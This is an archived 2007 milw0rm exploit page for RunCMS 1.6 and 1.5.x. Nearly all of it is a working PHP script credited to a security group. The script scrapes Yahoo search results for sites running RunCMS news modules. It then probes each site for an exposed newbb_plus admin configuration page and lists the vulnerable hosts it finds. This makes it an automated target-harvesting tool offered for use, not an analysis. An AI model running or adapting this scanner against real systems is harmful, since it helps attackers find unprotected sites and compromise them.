<html><head><title>RunCMS <= 1.6 disclaimer.php Remote File Overwrite Exploit</title></head><pre>&lt;?php
########################## WwW.BugReport.ir ###########################################
#
#      AmnPardaz Security Research &amp; Penetration Testing Group
#
# Title: RunCms`s Bug Yahoo! Crawler
# Vendor: http://www.runcms.org/
# Vulnerable Version: RunCMS 1.6 Halloween, 1.5.x (prior versions also may be affected)
# Exploitation: Remote with browser
# Coded By: trueend5 (trueend5 yahoo com)
#######################################################################################
# Leaders : Shahin Ramezany &amp; Sorush Dalili
# Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi
# Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com
# Country: Iran
# Contact : admin@bugreport.ir
######################## Bug Description ###########################
?&gt;

&lt;html dir=&quot;ltr&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;title&gt;RunCms`s Bug Yahoo! Crawler&lt;/title&gt;
&lt;style type=&quot;text/css&quot; media=&quot;screen&quot;&gt;
body {
	font-size: 10px;
	font-family: verdana;
}
INPUT {
	BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #00ff00; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body dir=&quot;ltr&quot; alink=&quot;#00ff00&quot;  bgcolor=&quot;#000000&quot; link=&quot;#00c000&quot; text=&quot;#008000&quot; vlink=&quot;#00c000&quot;&gt;
&lt;form action=&quot;?&quot; method=&quot;post&quot;&gt;
Run the Exploit And Use the results of &quot;Yahoo! Search Engine&quot; starting From the page:
&lt;input type=&quot;text&quot; name=&quot;StartPage&quot; value=&quot;1&quot; size=&quot;3&quot;&gt;
including
&lt;input type=&quot;text&quot; name=&quot;PerPage&quot; value=&quot;100&quot; size=&quot;3&quot;&gt;
results per page.&lt;BR&gt;&lt;BR&gt;
&lt;input type=&quot;submit&quot; name=&quot;Start&quot; value=&quot;Start&quot;&gt;
&lt;/form&gt;
&lt;?php

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);
ob_implicit_flush (1);


function sendpacket($packet)
{
	global $host, $html;
	$port  = 80;
		
	$ock=fsockopen(gethostbyname($host),$port);
    if ($ock)
	{
		fputs($ock,$packet);
		$html='';
		while (!feof($ock))
		{
			$html.=fgets($ock);
		}
		fclose($ock);
		// echo nl2br(htmlentities($html));
    }else echo '&lt;BR&gt;No response from '.htmlentities($host).'&lt;BR&gt;';
}

	// Start
	if(isset($_POST['Start'] ,$_POST['StartPage'] ,$_POST['PerPage']))
	{
		$StartPage = ((intval($_POST['StartPage'])) &gt; 0) ? intval($_POST['StartPage']) : 1;
		$PerPage   = ((intval($_POST['PerPage'])) &lt;= 100) ? intval($_POST['PerPage']) : 100;
		if (($StartPage*$PerPage) &gt; 1000)
		{
			echo &quot;Yahoo! Search doesn't show More than 1000 Results per query&quot;.&quot;&lt;BR&gt;&quot;;
			die();
		}
		echo 'Trying to obtain URLs Which are suspected to &quot;newbb_plus disclaimer.php
		 File Overwrite&quot; ...'.'&lt;BR&gt;';
		
		$Yahoo     = &quot;search.yahoo.com&quot;;
		$S         = $StartPage;
		$P         = $PerPage;
		
		for ($S; $S*$P &lt; 1000; $S++)
		{
			$host    = $Yahoo;
			$B       = ($S == 1) ? '' : '&amp;b='.((($S-1)*$P)+1);
			$Query   = &quot;/search?p=runcms+inurl%3A%22%2Fmodules%2Fnews%2F%22&amp;n=$P&amp;ei=utf-8&amp;va_vt=any&amp;vo_vt=any&amp;ve_vt=any&amp;vp_vt=url&amp;vd=all&amp;vst=0&amp;vf=all&amp;vm=p&amp;fl=0&amp;xargs=0&amp;pstart=1&quot;.$B;
			
			$packet  = &quot;GET &quot;.$Query.&quot; HTTP/1.1\r\n&quot;;
			$packet .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
			$packet .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
			$packet .= &quot;Connection: Close\r\n\r\n&quot;;
			sendpacket($packet);
			if(stristr($html , '403 Forbidden') === false 
			&amp;&amp; stristr($html , '302 Moved') === false)
			{
				echo '&lt;HR&gt;&lt;BR&gt;&lt;CENTER&gt;Obtained URLs From Page:'.($S).'&lt;CENTER&gt;&lt;BR&gt;';
				$Pattern = '/href=&quot;http:\/\/?([^\/]+)?(\/[a-zA-Z]+)?(\/modules\/news\/)/i';
				preg_match_all($Pattern, $html, $Matches);
				$TotalLinks = count($Matches[1]);
				echo &quot;In Progress&lt;BR&gt;&quot;;
				for ($I=0; $I &lt; $TotalLinks; $I++)
				{
					echo &quot;.&quot;;
					if ($Matches[2][$I] == '')
					{
						$Path = &quot;/modules/newbb_plus/admin/forum_config.php&quot;;
					}else 
					$Path    = $Matches[2][$I].&quot;/modules/newbb_plus/admin/forum_config.php&quot;;
					$host    = $Matches[1][$I];
					$packet  = &quot;GET &quot;.$Path.&quot; HTTP/1.1\r\n&quot;;
					$packet .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
					$packet .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
					$packet .= &quot;Connection: Close\r\n\r\n&quot;;
					sendpacket($packet);
					if(stristr($html , '_MD_A_CONFIGFORUM') !== false)
					{
						echo &quot;&lt;BR&gt;&lt;A href='http://&quot;.$host.$Path.&quot;'&gt;&quot;.$host.$Path.&quot;&lt;/A&gt;&lt;BR&gt;&quot;;
					}					
				}
			}else 
			{
				echo '&lt;BR&gt;'.'Yahoo! finds out that this in an automated request
				 from a malware! So try again after awhile!';
				die();
			}
		}
	}
?&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2007-11-25]</pre></html>